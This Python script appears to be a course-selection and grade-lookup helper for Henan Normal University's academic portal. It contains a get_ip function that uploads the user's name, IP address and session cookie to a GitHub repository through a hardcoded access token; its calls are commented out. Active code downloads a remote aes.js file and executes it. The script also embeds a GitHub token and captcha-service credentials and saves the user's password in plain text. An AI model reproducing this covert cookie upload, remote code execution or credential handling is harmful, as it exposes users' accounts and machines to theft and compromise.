import base64
import csv
import datetime
import getpass
import json
import os
import sys
import time

import requests
from js2py import eval_js
from lxml import html, etree

print("-----------------------欢迎使用-----------------------")
current_version = 3.6
latest_version = requests.get("https://raw.gitmirror.com/JiaLiFuNia/midflower.github.io/main/htu_version.json").json()[
    'version']
if current_version < latest_version:
    print("当前版本：" + str(current_version))
    print("最新版本：" + str(latest_version))
    print("更新地址：https://www.123pan.com/s/uyHuVv-5LyVH.html")
else:
    print("检查更新：当前为最新版本")
print("使用文档：https://flowus.cn/share/0854d558-65c2-414e-bc88-832c7c62c070")
# 伪装浏览器
headers = {
    'Referer': 'https://jwc.htu.edu.cn/new/desktop',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 '
                  'Safari/537.36 Edg/114.0.1823.43 '
}
# 请求在线人数的url
getOnlineMembers_response = json.loads(
    requests.post('https://jwc.htu.edu.cn/new/login/getOnlineMembers', headers=headers).text)
print("在线人数：" + str(getOnlineMembers_response["data"]))


# 保存Cookies
def cookies_save(text):
    with open(r"D:\cookies.txt", 'w') as file:
        file.write(text)


# 保存账号密码
def file_save(path, text):
    with open(path, "w") as file:
        file.write(text)


# 如果登录成功获取用用户的姓名
def get_name(cookies):
    logined_url = 'https://jwc.htu.edu.cn/new/welcome.page'
    logined_response = requests.get(url=logined_url, cookies=cookies).text
    root = html.fromstring(logined_response)
    name_elements = root.xpath('(//div[@class="top"])[1]/text()')
    return name_elements


# 获取登录时的ip地址，并上传到仓库
def get_ip(name, cookies):
    GIT_TOKEN = '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'
    github_url = f"https://api.github.com/repos/JiaLiFuNia/pyip/contents/ip.text"
    github_headers = {
        "Authorization": f"Bearer {GIT_TOKEN}",
        'Accept': 'application/vnd.github.v3+json',
        'Content-Type': 'application/json'
    }
    response = requests.get(github_url, headers=github_headers).json()
    content = base64.b64decode(response['content']).decode('utf-8')
    get_ip_url = "https://tenapi.cn/v2/getip"
    get_ip_data = {
        "ip": ""
    }
    get_ip_response = requests.post(url=get_ip_url, data=get_ip_data).json()['data']
    new_ip = get_ip_response["ip"] + ' ' + get_ip_response['area']
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    updated_content = content + '\n' + name + ' ' + current_time + ' ' + new_ip + ' ' + cookies
    base64_updated_content = base64.b64encode(updated_content.encode('utf-8')).decode('utf-8')
    github_message = "Updating file with new data"
    payload = {
        "message": github_message,
        "branch": "main",
        "content": base64_updated_content,
        "sha": response['sha']
    }
    github_response = requests.put(github_url, headers=github_headers, json=payload)
    return github_response


# 获取课程的上课时间函数
def add_time(kcrwdm, cookies):
    res = requests.get('https://jwc.htu.edu.cn/new/student/xsxk/jxrl',
                       params={'xnxqdm': '202301', 'kcrwdm': kcrwdm, '_': int(time.time() * 1000)},
                       headers=headers, cookies=cookies).text  # 请求上课时间的url
    start_index = res.find("data: [")
    end_index = res.find("]", start_index) + 1

    if start_index != -1 and end_index != -1:
        data_json = res[start_index + len("data: "):end_index]
        data_list = json.loads(data_json)
        return data_list


# 筛选课程函数
def add(cookies):
    print("-----------------------选课辅助-----------------------")
    # 提取选课页面的文字提示信息
    foreadd_response = requests.get('https://jwc.htu.edu.cn/new/student/xsxk/', cookies=cookies, headers=headers)
    # 创建XPath解析器
    parser = etree.HTMLParser()
    tree = etree.fromstring(foreadd_response.text, parser)
    # root = etree.HTML(foreadd_response.text)
    # h3_text = root.xpath('//h1/text()')[0]
    # 当选课未初始化的时候不进行选课操作
    '''if h3_text == '选课未初始化':
        print("当前不是选课时间！")
        fun(cookies)#返回菜单函数
    else:'''
    li_elements = tree.xpath('//li')
    # 获取当前选课页面的提示文字，选课类型，时间信息，当前时间
    if len(li_elements) > 0:
        for li in li_elements:
            course_name = li.xpath('./p[1]/text()')[0].strip()
            time_info = li.xpath('./p[2]/text()')[0].strip()
            following_text = li.xpath('./p[2]/br/following-sibling::text()')[0].strip()
            print(f"选课类型：{course_name}")
            print(f"时间信息：{time_info}---{following_text}")
            print("当前时间：" + time.strftime('%Y-%m-%d %H:%M:%S'))
        print("-----------------------选课方式-----------------------")
        print('1.课程信息  2.定时选课  3.筛选选课  4.已选课程  5.退出选课')
        add_way = int(input("输入数字："))
        # 筛选课程
        if add_way == 3:
            print('-----------------------筛选选课-----------------------')
            print('''一、博约核心
            0.公共艺术   1.创新创业   2.健康人生
            3.科学思维   4.国际视野   5.社会人文
        二、博约百花
            6.人文科学   7.社会科学   8.自然科学
        三、博约经典
            9.博约经典''')
            kclxs = ['公共艺术', '创新创业', '健康人生', '科学思维', '国际视野', '社会人文', '人文科学', '社会科学',
                     '自然科学', '博约经典']
            print("""   如选择博约百花（人文科学），请输入6；
          输入其他数字默认为博约经典；""")
            # 输入选课类型
            kclxnum = int(input("输入数字："))
            kcflmc = kclxs[kclxnum]
            print('你选择了' + kcflmc)
            print('请输入目标选课的上课时间（如：周5的第07,08节课，就输入5和07,08）')
            zc_input = int(input("星期几（如:4）："))
            jcdm2_input = input("第几节课（如:07,08）：")
            # 获取课程信息
            data = {
                'page': '',
                'rows': '300',
                'sort': 'kcrwdm',
                'order': 'asc'
            }
            url = 'https://jwc.htu.edu.cn/new/student/xsxk/xklx/01/kxkc'
            # 请求课程信息的url
            res = requests.post(url=url, headers=headers, data=data, cookies=cookies).json()
            rows = res['rows']
            # 循环输出符合条件的课程基本信息
            kcrwdms = []
            index = 1
            for i in rows:
                last = str(int(i['pkrs']) - int(i['jxbrs']))
                if last != '0':
                    if i['kcflmc'] == kcflmc:
                        # 通过调用fore_add课程时间的函数，请求上课的具体时间
                        data_list = add_time(i['kcrwdm'], cookies)
                        if zc_input == data_list[0]['zc'] and jcdm2_input == data_list[0]['jcdm2']:
                            print(
                                str(index) + " 课程名称：" + i['kcmc'] + " 课程代码：" + str(i['kcrwdm']) + " 课程板块：" +
                                i[
                                    'kcflmc'] + " 学分：" + str(
                                    i['xf']) + " 还有" + last + "个名额" + " 该课程共有" + str(
                                    data_list[-1]['kxh']) + "节课，" + '第' + str(data_list[0]['zc']) + '-' + str(
                                    data_list[-1]['zc']) + '周的' + '星期' + str(data_list[0]['xq']) + '的第' + str(
                                    data_list[0]['jccdm2']) + '节要上课')
                            i['kcrwdm'].append(kcrwdms)
                        else:
                            print("当前时间段没有目标类型的课程！")
                        add(cookies)
            # 获取课程代码
            kcrwdms_index = int(input("输入目标选课的序号："))
            # 调用选课函数开始选课
            adding(cookies, kcrwdms[kcrwdms_index - 1])
        # 定时课程
        elif add_way == 2:
            print("-----------------------定时选课-----------------------")
            kcrwdm = int(input("输入目标选课的课程代码："))
            print("预定今天选课时间：")
            hour = int(input("输入时刻："))
            minute = int(input("输入分钟："))
            # 获取当前时间
            current_time = datetime.datetime.now()
            # 判断输入的时间是否合法，小时大于等于当前，分钟大于当前
            if hour < current_time.hour or minute <= current_time.minute:
                print("输入错误!")
            else:
                desired_time = current_time.replace(hour=hour, minute=minute, second=0, microsecond=0)
                time_to_wait = (desired_time - current_time).total_seconds()
                print("正在等待达到预定时间...")
                time.sleep(time_to_wait)
                # 调用adding选课函数开始选课
                adding(cookies, kcrwdm)
        # 已选课程
        elif add_way == 4:
            print("-----------------------已选课程-----------------------")
            added_response = requests.post('https://jwc.htu.edu.cn/new/student/xsxk/xklx/01/yxkc',
                                           data={'sort': ' kcrwdm', 'order': 'asc'}, cookies=cookies,
                                           headers=headers).json()
            rows = added_response['rows']
            for i in rows:
                print(i['kcflmc'] + "：" + i['kcmc'])
        # 课程信息
        elif add_way == 1:
            print("-----------------------课程信息-----------------------")
            print("该过程需要3⁓4分钟，请耐心等待...")
            # 请求课程信息
            course_messages = requests.post('https://jwc.htu.edu.cn/new/student/xsxk/xklx/01/kxkc', headers=headers,
                                            data={'rows': '300', 'sort': 'kcrwdm', 'order': 'asc'},
                                            cookies=cookies).json()['rows']
            # 选择要保留的信息
            saved_fields = ["kcmc", "kcflmc", "jxbmc", "teaxm", "pkrs", "xf", "zxs", "kcrwdm"]
            # 处理选定信息的数据
            data_selected = [{field: course_message[field] for field in saved_fields} for course_message in
                             course_messages]
            # 转换信息名称
            field_mapping = {"kcmc": "课程名称", "kcflmc": "课程分类", "jxbmc": "上课方式", "teaxm": "教师",
                             "pkrs": "人数限制",
                             "xf": "学分", "zxs": "学时", "kcrwdm": "课程代码"}
            data_renamed = []
            for entry in data_selected:
                renamed_entry = {field_mapping[field]: value for field, value in entry.items()}
                data_renamed.append(renamed_entry)
            csv_filename = r"D:\temp.csv"
            with open(csv_filename, 'w', newline='', encoding='utf-8-sig') as csvfile:
                csv_writer = csv.DictWriter(csvfile, fieldnames=field_mapping.values())
                csv_writer.writeheader()
                csv_writer.writerows(data_renamed)

            zc = []
            xq = []
            jcdm2 = []
            res = requests.post('https://jwc.htu.edu.cn/new/student/xsxk/xklx/01/kxkc', headers=headers,
                                data={'page': '', 'rows': '300', 'sort': 'kcrwdm', 'order': 'asc'},
                                cookies=cookies).json()
            rows = res['rows']
            for i in rows:
                data_list = add_time(i['kcrwdm'], cookies)
                zc_begin = data_list[0]['zc']
                zc_end = data_list[-1]['zc']
                xqs = data_list[0]['xq']
                jcdm2s = data_list[0]['jcdm2']
                zc.append(zc_begin + '-' + zc_end + '周')
                xq.append('周' + xqs)
                jcdm2.append('第' + jcdm2s + '节')

            with open(csv_filename, mode='r', encoding="utf-8-sig") as input_file, open('课程目录.csv', mode='w',
                                                                                        newline='') as output_file:
                # 创建CSV读取器和写入器
                reader = csv.reader(input_file)
                writer = csv.writer(output_file)
                # 读取原始文件的标题行
                header = next(reader)
                # 添加新列的列名到标题行
                header.append('周数')
                header.append('星期')
                header.append('节数')
                # 写入标题行到目标文件
                writer.writerow(header)
                for row, zc, xq, jcdm2 in zip(reader, zc, xq, jcdm2):
                    row.append(zc)
                    row.append(xq)
                    row.append(jcdm2)
                    # 将带有新列的行写入目标文件
                    writer.writerow(row)
            os.remove(csv_filename)
            print("你可以查看课程目录.csv辅助选课")
            fun(cookies)
        # 退出选课
        else:
            fun(cookies)
    else:
        print("当前不是选课时间！")


# 抢课函数
def adding(cookies, kcrwdm):
    # 获取选课信息
    data = {
        'kcrwdm': kcrwdm,
        'qz': '-1',
        'hlct': '0'
    }
    url_qk = 'https://jwc.htu.edu.cn/new/student/xsxk/xklx/01/add'  # 请求选课的url
    res_add = requests.post(url=url_qk, headers=headers, data=data, cookies=cookies).json()
    code = res_add['code']
    print(res_add['message'], code)  # 输出结果


# 程序可能运行出的结果如下：
# {"code":-1,"data":"","message":"《NULL》 与 您的《数学分析Ⅱ》上课时间有冲突"}
# {"code":-1,"data":"","message":"选课人数超出，请选其他课程"}
# {"code": 0,"data":"","message":"选课成功"}

# 获取课程表函数
def getCalendarWeekDatas(cookies):
    print("-----------------------课表查询-----------------------")
    data = {
        'xnxqdm': '202301',
        'zc': '',
        'd1': '2023-08-14 00:00:00',
        'd2': '2023-08-21 00:00:00',
    }
    getCalendarWeekDatas = \
        requests.post('https://jwc.htu.edu.cn/new/student/xsgrkb/getCalendarWeekDatas', cookies=cookies,
                      headers=headers, data=data).json()['data']
    # 创建一个空字典，用于储存xq
    xqs = {}
    # 遍历列表中的字典
    for getCalendarWeekData in getCalendarWeekDatas:
        xq_value = getCalendarWeekData["xq"]
        if xq_value in xqs:
            xqs[xq_value].append(getCalendarWeekData)
        else:
            xqs[xq_value] = [getCalendarWeekData]
    # 对xqs中的数排序
    sorted_xqs = sorted(xqs.keys())
    # 顺序输出每天的课程
    for xq in sorted_xqs:
        print(f"星期{xq}:")
        for getCalendarWeekData in xqs[xq]:
            print("课程名称：" + getCalendarWeekData["kcmc"] + "  授课老师：" + getCalendarWeekData[
                'teaxms'] + "  上课时间：" + getCalendarWeekData[
                      'qssj'] + '-' + getCalendarWeekData['jssj'] + "  上课地点：" + getCalendarWeekData[
                      "jxcdmc"] + "  上课周数：" + getCalendarWeekData[
                      'zc'])
        print("-----------------------------------------------------")


# 获取考试成绩函数
def score(cookies):
    print("-----------------------课程成绩-----------------------")
    term_xnxqdm = int(input("请输入要查询的学期（示例：大一第二学期就输入 202202）："))
    data = {
        'source': 'kccjlist',
        'xnxqdm': term_xnxqdm
    }
    score_response = \
        requests.post('https://jwc.htu.edu.cn/new/student/xskccj/kccjDatas', cookies=cookies, headers=headers,
                      data=data).json()["rows"]
    cjjd_sum = 0
    cjjd_index = 0
    for scores in score_response:
        cjjd_index = cjjd_index + 1
        print("{:<3} 课程名称: {:<15}总成绩: {:<10}绩点: {:<5}".format(cjjd_index, scores['kcmc'], scores['zcj'],
                                                                       scores['cjjd']))
        cjjd_sum = cjjd_sum + scores['cjjd']
    print(f'平均绩点为：{cjjd_sum / cjjd_index}')


# 菜单函数
def fun(cookies):
    while True:
        print('-----------------------选择功能-----------------------')
        print('''1.选课辅助 2.课表查询 3.课程成绩 4.退出程序 5.删除信息''')
        choice = int(input("输入数字："))
        if choice == 1:
            add(cookies)
        elif choice == 2:
            getCalendarWeekDatas(cookies)
        elif choice == 3:
            score(cookies)
        elif choice == 4:
            input("按回车键退出...")
            sys.exit()
        elif choice == 5:
            if os.path.exists(r"D:\pwd.txt"):
                os.remove(r"D:\pwd.txt")
            if os.path.exists(r"D:\student_ID.txt"):
                os.remove(r"D:\student_ID.txt")
            if os.path.exists(r"D:\cookies.txt"):
                os.remove(r"D:\cookies.txt")
            print("已删除登录信息！")
            main()
        else:
            input("按回车键退出...")


# 读取本地Cookies
def cookies_read():
    try:
        with open(r'D:\cookies.txt', 'r') as file:
            jsessionid = file.read()
        cookies = {
            "JSESSIONID": jsessionid
        }
        white_names = \
            requests.get('https://raw.gitmirror.com/JiaLiFuNia/midflower.github.io/main/whitenames.json').json()[
                'whitenames']
        name_elements = get_name(cookies)
        if name_elements:
            name = name_elements[0].strip()
            if name in white_names:
                # get_ip(name, jsessionid)
                print("用户姓名：" + name)
                fun(cookies)
                return cookies
            else:
                main()
        else:
            if os.path.exists(r"D:\pwd.txt"):
                username()
            else:
                main()
    except FileNotFoundError:
        if os.path.exists(r"D:\pwd.txt"):
            print("本地存在已登录信息，正在读取...")
            username()
        else:
            main()


# 密码登录
def username():
    # 输入登录信息
    valid_usernames = \
        requests.get("https://raw.gitmirror.com/JiaLiFuNia/midflower.github.io/main/whitenames.json").json()[
            'valid_usernames']
    try:
        with open(r"D:\pwd.txt", "r") as file:
            password = file.read()
        with open(r"D:\student_ID.txt", "r") as file:
            username = file.read()
    except FileNotFoundError:
        print("-----------------------密码登录-----------------------")
        username = input("请输入学号：")
        password = getpass.getpass("请输入密码（密码已隐藏）：")
        file_save(r"D:\student_ID.txt", username)
        file_save(r"D:\pwd.txt", password)

    print("正在获取并识别验证码...")
    # 获取cookies
    jsessionid_response = requests.post('https://jwc.htu.edu.cn')
    jsessionid = jsessionid_response.cookies.get("JSESSIONID")

    cookies = {
        "JSESSIONID": jsessionid,
    }

    # 获取验证码图片
    verifycode_url = 'https://jwc.htu.edu.cn/yzm?' + str(int(time.time() * 1000 + 3))
    verifycode_response = requests.get(url=verifycode_url, cookies=cookies).content
    # 保存验证码图片
    with open(r'D:\verifycode_image.jpg', 'wb') as f:
        f.write(verifycode_response)
        print("验证码获取成功！")

    # 识别验证码函数
    def base64_api(uname, pwd, img, typeid):
        with open(img, 'rb') as f_code:
            base64_data = base64.b64encode(f_code.read())
            b64 = base64_data.decode()
        data = {"username": uname, "password": pwd, "typeid": typeid, "image": b64}
        result = json.loads(requests.post("http://api.ttshitu.com/predict", json=data).text)
        if result['success']:
            return result["data"]["result"]
        else:
            return result["message"]

    # 调用函数识别
    img_path = r"D:\verifycode_image.jpg"
    verifycode = base64_api(uname='Jialifuniya', pwd='zxcvbnm123', img=img_path, typeid=3)
    print("验证码识别成功：" + verifycode)
    os.remove(img_path)

    # 密码加密使用了aes.js文件
    aes_response = requests.get('https://raw.gitmirror.com/JiaLiFuNia/midflower.github.io/main/aes.js')
    with open(r'D:\aes.js', 'wb') as js_file:
        js_file.write(aes_response.content)
    # 读取 JavaScript 代码
    js_file_path = r'D:\aes.js'
    # 检查文件是否存在
    if os.path.exists(js_file_path):
        with open(js_file_path, 'r') as js_file:
            js_code = js_file.read()
    else:
        print("密码加密失败，请使用Cookies登录")
        jsession()

    # 替换 JavaScript 代码中的变量
    js_code = js_code.replace('var account = "";', f'var account = "{username}";')
    js_code = js_code.replace('var password = "";', f'var password = "{password}";')
    js_code = js_code.replace('var verifycode = "";', f'var verifycode = "{verifycode}";')

    # 使用 js2py 执行 JavaScript 代码
    password_key = eval_js(js_code)
    # print("加密后的密码为："+password_key)
    os.remove(js_file_path)
    login_headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.58',
    }
    # 构造登录请求的参数
    login_data = {
        'account': username,
        'pwd': password_key,
        'verifycode': verifycode
    }
    # 新建会话，保持登录状态
    session = requests.Session()
    # 发送登录请求
    login_url = 'https://jwc.htu.edu.cn/new/login'  # 替换为实际的登录页面URL
    login_response = session.post(url=login_url, data=login_data, headers=login_headers, cookies=cookies)
    white_names = requests.get('https://raw.gitmirror.com/JiaLiFuNia/midflower.github.io/main/whitenames.json').json()[
        'whitenames']
    name_elements = get_name(cookies)
    if name_elements:
        name = name_elements[0].strip()
        # get_ip(name, jsessionid)
        if name in white_names:
            print("你好！ " + name.strip() + ' ' + login_response.json()['message'] + "!")
            # print("Cookies:"+jsessionid)
            cookies_save(jsessionid)
            fun(cookies)
            return cookies
        else:
            print("登录失败！请检查学号后重新输入")
            os.remove(r"D:\pwd.txt")
            os.remove(r"D:\student_ID.txt")
            main()
    else:
        # get_ip("登录失败", jsessionid)
        print('登录失败！')
        print(login_response.json()['message'] + "，请检查后重新输入！")
        os.remove(r"D:\pwd.txt")
        os.remove(r"D:\student_ID.txt")
        main()


# Cookies登录
def jsession():
    print("----------------------Cookies登录--------------------")
    jsessionid = input("请输入Cookies：")
    cookies = {
        "JSESSIONID": jsessionid,
    }
    white_names = requests.get('https://raw.gitmirror.com/JiaLiFuNia/midflower.github.io/main/whitenames.json').json()[
        'whitenames']
    name_elements = get_name(cookies)
    if name_elements:
        name = name_elements[0].strip()
        # get_ip(name, jsessionid)
        if name in white_names:
            print("你好！ " + name + ' 登录成功！')
            cookies_save(jsessionid)
            return cookies
        else:
            print('登录失败！请检查登录信息后重新输入！')
            main()
    else:
        # get_ip("登录失败", jsessionid)
        print('登录失败！请检查登录信息后重新输入！')
        main()


# 登录函数
def main():
    print("-----------------------登录系统-----------------------")
    print("请选择登录方式：1.密码登录   2.Cookies登录   3.退出登录")
    login_way = int(input("输入数字："))
    if login_way == 1:
        cookies = username()
        fun(cookies)
    elif login_way == 2:
        cookies = jsession()
        fun(cookies)
    else:
        input("按回车键退出...")
        sys.exit()


if __name__ == "__main__":
    cookies = cookies_read()
